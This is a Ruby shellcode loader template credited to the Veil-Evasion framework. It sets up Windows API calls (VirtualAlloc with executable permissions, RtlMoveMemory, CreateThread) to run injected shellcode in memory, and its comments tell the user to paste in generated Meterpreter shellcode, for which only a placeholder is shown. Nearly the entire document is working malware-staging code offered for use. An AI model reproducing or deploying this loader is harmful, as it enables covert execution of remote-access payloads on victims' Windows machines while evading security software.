# ruby template | Author: @harmj0y (veil evasion framework)
# ruby shellcode stager | ocra - 'One Click Ruby Application'
# https://github.com/Veil-Framework/Veil-Evasion/blob/master/modules/payloads/ruby/shellcode_inject/flat.py
# https://github.com/Veil-Framework/Veil-Evasion/blob/master/modules/payloads/ruby/meterpreter/rev_tcp.py
#
# ruby template to execute shellcode into memory (ram)
# inject the generated shellcode (chars.raw) just bellow
# 'shellcode =' replacing the existing shellcode by our own...
# ---



require 'rubygems'
require 'win32/api'
include Win32
exit if Object.const_defined?(:Ocra)

# set up all the WinAPI function declarations
VirtualAlloc = API.new('VirtualAlloc', 'IIII', 'I')
RtlMoveMemory = API.new('RtlMoveMemory', 'IPI', 'V')
CreateThread = API.new('CreateThread', 'IIIIIP', 'I')
WaitForSingleObject = API.new('WaitForSingleObject', 'II', 'I')

# Our Meterpreter (shellcode) code goes here
shellcode = 
"\xfc\xe8\x89\bla\bla\bla..."


# Reserve the necessary amount of virtual address space
# VirtualAlloc needs to have at least 0x1000 specified as the length otherwise it'll fail
ptr = VirtualAlloc.call(0,(shellcode.length > 0x1000 ? shellcode.length : 0x1000), 0x1000, 0x40)


# move the payload buffer into the allocated area
x = RtlMoveMemory.call(ptr,shellcode,shellcode.length)

# start the thread
handleID = CreateThread.call(0,0,ptr,0,0,0)
